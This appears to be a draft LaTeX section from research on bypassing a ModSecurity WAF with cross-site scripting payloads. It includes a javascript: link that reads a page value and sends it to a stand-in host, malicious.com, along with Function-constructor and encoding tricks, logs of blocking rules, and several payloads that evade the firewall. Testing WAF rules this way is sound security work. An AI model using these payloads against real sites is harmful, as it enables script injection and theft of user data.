\section{Evaluation Results}
\label{sec:EvaluationResults}
Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
\begin{lstlisting}[style=basicStyle]
<a href=j&#97v&#97script&#x3A;
var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
var&#32data&#32=&#32&#123body:secret,method:'POST'\};
fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
\end{lstlisting}

\begin{itemize}
	\item Using function constructor to evade eval() detection
	\item supplying the argument via tagged template literal to avoid () characters
	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
\end{itemize}

theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection

\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}


tried to encode the  payload:
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}
with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO

weird unicode: tried using
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

but result is

{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}

tried using \u0000 - \u0009, \u2028, \u2029 but that makes the payload invalid. would work in the case when some characters are filtered first by the application, like linebreaks
\end{lstlisting}

in contrary to not using \verb|()|, a payload thats not using any \verb|{}| but still allows for tagged template literals or other usages of \verb|{}| can be created using string replace. the example payload in Listing~\ref{lst:stringreplaceblocked} is being blocked by the modsecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} example, label={lst:stringreplaceblocked}]
<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${2 2}"</MatchedData>
\end{lstlisting}

if one uses a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of

\begin{lstlisting}[style=basicStyle, caption=string replace to evade {} detection, label={lst:stringreplacepass}]
[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

successfully evades the firewall.


unicode tests:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>

<payload>encodeURIComponent('\u0024{`alert`}')</payload>
<payload>%24%7B%60alert%60%7D</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>
\end{lstlisting}

url encoding: the modsecurity firewall detects url encoding. when sending example requests in plain and urlencoded forms, the requests get blocked. (See Listing~\ref{lst:urlencodedexampleblocked})

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>alert(%60%24%7Bnew%20Date()%7D%60)</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

on usage of double url encoding (see Listing~\ref{lst:doubleurlencodedexample}), the above mentioned rule with message \quotes{Remote Command Execution: Unix Shell Expression Found} does no longer trigger. the characters \verb|alert(| still trigger \quotes{Javascript Method detected}. substituting \verb|alert()| with \verb|prompt()| and using a tagged template literal instead of calling with \verb|()| will allow to successfully pass a payload that evades detection and is able to display the template parameter. however, this payload would not be valid unless the target performs multiple step url decoding.


\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doubleurlencodedexample}]
encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)'))
=
alert(%2560%2524%257Bnew%2520Date()%257D%2560)
\end{lstlisting}
